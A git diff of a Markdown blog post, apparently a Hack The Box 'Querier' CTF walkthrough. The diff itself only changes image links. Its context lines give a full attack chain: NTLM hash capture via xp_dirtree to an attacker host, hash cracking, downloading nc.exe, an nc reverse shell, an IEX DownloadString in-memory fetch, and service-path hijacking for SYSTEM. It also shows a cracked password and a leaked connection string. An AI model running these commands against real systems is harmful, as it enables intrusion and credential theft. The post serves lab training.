@@ -7,7 +7,7 @@ tags:
   - writeup
 description: "Room Link: https://app.hackthebox.com/machines/Querier"
 canonical_url: "https://medium.com/@hemanthakrishnach/htb-querier-walkthrough-acf8c617cb68"
-image: "/assets/images/posts/htb-querier-walkthrough/img-000-134092ec.png"
+image: "https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/htb-querier-walkthrough/img-000-134092ec.png"
 ---
 
 Room Link: https://app.hackthebox.com/machines/Querier
@@ -16,7 +16,7 @@ Room Link: https://app.hackthebox.com/machines/Querier
 
 ### HTB Querier — Walkthrough
 
-![image](/assets/images/posts/htb-querier-walkthrough/img-000-134092ec.png)
+![image](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/htb-querier-walkthrough/img-000-134092ec.png)
 
 Room Link: <https://app.hackthebox.com/machines/Querier>
 
@@ -26,7 +26,7 @@ A full TCP port scan reveals the target’s attack surface:
 ```bash
 nmap -T4 -p- -A -Pn <MACHINE_IP>
 ```
-![image](/assets/images/posts/htb-querier-walkthrough/img-001-6ac08351.png)![image](/assets/images/posts/htb-querier-walkthrough/img-002-8e1650b6.png)
+![image](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/htb-querier-walkthrough/img-001-6ac08351.png)![image](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/htb-querier-walkthrough/img-002-8e1650b6.png)
 
 Key open ports:
 
@@ -38,7 +38,7 @@ Anonymous SMB access is available. Listing shares with no password:
 ```cpp
 smbclient -L //<MACHINE_IP>/ -U anonymous
 ```
-![image](/assets/images/posts/htb-querier-walkthrough/img-003-d4dbb74e.png)
+![image](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/htb-querier-walkthrough/img-003-d4dbb74e.png)
 
 A non-default share named **Reports** is visible. Connecting and listing its contents:
 ```bash
@@ -53,15 +53,15 @@ Running `binwalk` on the file reveals it's a ZIP archive (standard Office Open X
 ```typescript
 binwalk Currency\ Volume\ Report.xlsmbinwalk -e Currency\ Volume\ Report.xlsm
 ```
-![image](/assets/images/posts/htb-querier-walkthrough/img-004-ae23c409.png)![image](/assets/images/posts/htb-querier-walkthrough/img-005-70596b28.png)
+![image](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/htb-querier-walkthrough/img-004-ae23c409.png)![image](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/htb-querier-walkthrough/img-005-70596b28.png)
 
 After extraction, inspecting the VBA binary:
 ```bash
 cd _Currency\ Volume\ Report.xlsm.extracted/xlcat vbaProject.bin
 ```
-![image](/assets/images/posts/htb-querier-walkthrough/img-006-1a20dfaa.png)
+![image](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/htb-querier-walkthrough/img-006-1a20dfaa.png)
 
-Readable strings within the binary reveal a hardcoded connection string:![image](/assets/images/posts/htb-querier-walkthrough/img-007-a4e3648b.png)
+Readable strings within the binary reveal a hardcoded connection string:![image](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/htb-querier-walkthrough/img-007-a4e3648b.png)
 ```ini
 Uid=reporting;Pwd=PcwTWTHRwryjc$c6
 ```
@@ -79,7 +79,7 @@ The connection succeeds and the database context switches to `volume`. However, 
 ```scss
 [-] ERROR(QUERIER): Line 105: User does not have permission to perform this action.
 ```
-![image](/assets/images/posts/htb-querier-walkthrough/img-008-44d2ad3f.png)
+![image](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/htb-querier-walkthrough/img-008-44d2ad3f.png)
 
 ### NTLM Hash Capture via xp\_dirtree
 
@@ -89,25 +89,25 @@ Since `xp_cmdshell` is unavailable, a different technique is used to escalate: f
 ```bash
 mkdir sharesmbserver.py -smb2support share share/
 ```
-![image](/assets/images/posts/htb-querier-walkthrough/img-009-53b15162.png)
+![image](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/htb-querier-walkthrough/img-009-53b15162.png)
 
 **Step 2 — Trigger an outbound SMB connection from SQL Server:**
 ```bash
 exec xp_dirtree '\\<ATTACKER_IP>\share',1,1
 ```
-![image](/assets/images/posts/htb-querier-walkthrough/img-010-bc07a60c.png)
+![image](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/htb-querier-walkthrough/img-010-bc07a60c.png)
 
 The Impacket SMB server captures the incoming authentication:
 ```scss
 [*] AUTHENTICATE_MESSAGE (QUERIER\mssql-svc, QUERIER)[*] User mssql-svc\QUERIER authenticated successfully[*] mssql-svc::QUERIER:4141414141414141:<NTLMv2 hash>
 ```
-![image](/assets/images/posts/htb-querier-walkthrough/img-011-09d942cb.png)
+![image](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/htb-querier-walkthrough/img-011-09d942cb.png)
 
 **Step 3 — Crack the hash with Hashcat (mode 5600 = NTLMv2):**
 ```bash
 hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
 ```
-![image](/assets/images/posts/htb-querier-walkthrough/img-012-772b969f.png)
+![image](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/htb-querier-walkthrough/img-012-772b969f.png)
 
 **Password cracked:** `corporate568`
 
@@ -119,7 +119,7 @@ Re-authenticating with the `mssql-svc` account:
 ```bash
 mssqlclient.py QUERIER/mssql-svc:'corporate568'@<MACHINE_IP> -windows-auth
 ```
-![image](/assets/images/posts/htb-querier-walkthrough/img-013-422293ac.png)
+![image](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/htb-querier-walkthrough/img-013-422293ac.png)
 
 This account has `sysadmin` rights. Enabling `xp_cmdshell` now succeeds:
 ```typescript
@@ -131,7 +131,7 @@ Enumerating users on the system:
 xp_cmdshell dir C:\users
 ```
 
-The user flag is located at `C:\users\mssql-svc\desktop\user.txt`.![image](/assets/images/posts/htb-querier-walkthrough/img-014-ff87e410.png)
+The user flag is located at `C:\users\mssql-svc\desktop\user.txt`.![image](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/htb-querier-walkthrough/img-014-ff87e410.png)
 
 ### Reverse Shell
 
@@ -139,7 +139,7 @@ The user flag is located at `C:\users\mssql-svc\desktop\user.txt`.![image](/asse
 ```swift
 xp_cmdshell powershell -c Invoke-WebRequest "http://<ATTACKER_IP>/nc.exe" -OutFile "C:\Reports\nc.exe"
 ```
-![image](/assets/images/posts/htb-querier-walkthrough/img-015-fe09a452.png)
+![image](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/htb-querier-walkthrough/img-015-fe09a452.png)
 
 **Step 2 — Set up a listener on the attacker machine:**
 ```bash
@@ -150,9 +150,9 @@ nc -lvnp 4444
 ```xml
 xp_cmdshell C:\Reports\nc.exe <ATTACKER_IP> 4444 -e cmd.exe
 ```
-![image](/assets/images/posts/htb-querier-walkthrough/img-016-362c3ccd.png)
+![image](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/htb-querier-walkthrough/img-016-362c3ccd.png)
 
-A shell is returned running as `QUERIER\mssql-svc`.![image](/assets/images/posts/htb-querier-walkthrough/img-017-d22a5489.png)
+A shell is returned running as `QUERIER\mssql-svc`.![image](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/htb-querier-walkthrough/img-017-d22a5489.png)
 
 ### Privilege Escalation
 
@@ -162,7 +162,7 @@ Fetching and running PowerUp directly in memory:
 ```vbnet
 echo IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/powerup.ps1') | powershell -noprofile -
 ```
-![image](/assets/images/posts/htb-querier-walkthrough/img-018-00118390.png)![image](/assets/images/posts/htb-querier-walkthrough/img-019-2872c26c.png)
+![image](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/htb-querier-walkthrough/img-018-00118390.png)![image](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/htb-querier-walkthrough/img-019-2872c26c.png)
 
 PowerUp identifies several attack vectors, including a **cached Group Policy Preferences (GPP) file** at:
 ```bash
@@ -181,19 +181,19 @@ psexec.py Administrator:'password'@10.129.44.207
 ```bash
 C:\Windows\system32> whoamint authority\system
 ```
-![image](/assets/images/posts/htb-querier-walkthrough/img-020-f3064c76.png)
+![image](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/htb-querier-walkthrough/img-020-f3064c76.png)
 
 The root flag is located at `C:\Users\Administrator\Desktop\root.txt`.
 
 ### Method 2 — Modifiable Service (UsoSvc)
 
-PowerUp also flags the **UsoSvc** (Update Orchestrator Service) as modifiable by the current user. The service runs as `LocalSystem`, so hijacking its binary path yields a SYSTEM shell.![image](/assets/images/posts/htb-querier-walkthrough/img-021-e5703772.png)
+PowerUp also flags the **UsoSvc** (Update Orchestrator Service) as modifiable by the current user. The service runs as `LocalSystem`, so hijacking its binary path yields a SYSTEM shell.![image](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/htb-querier-walkthrough/img-021-e5703772.png)
 
 **Step 1 — Reconfigure the service binary path to execute a reverse shell:**
 ```bash
 sc config UsoSvc binpath="C:/reports/nc.exe <ATTACKER_IP> 5555 -e cmd.exe"
 ```
-![image](/assets/images/posts/htb-querier-walkthrough/img-022-97e67ed1.png)
+![image](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/htb-querier-walkthrough/img-022-97e67ed1.png)
 
 Verify the change:
 ```typescript
@@ -210,7 +210,7 @@ nc -lvnp 5555
 sc stop UsoSvcsc start UsoSvc
 ```
 
-The listener receives a connection as `nt authority\system`.![image](/assets/images/posts/htb-querier-walkthrough/img-023-7a376b83.png)
+The listener receives a connection as `nt authority\system`.![image](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/htb-querier-walkthrough/img-023-7a376b83.png)
 
 ### Key Takeaways
 
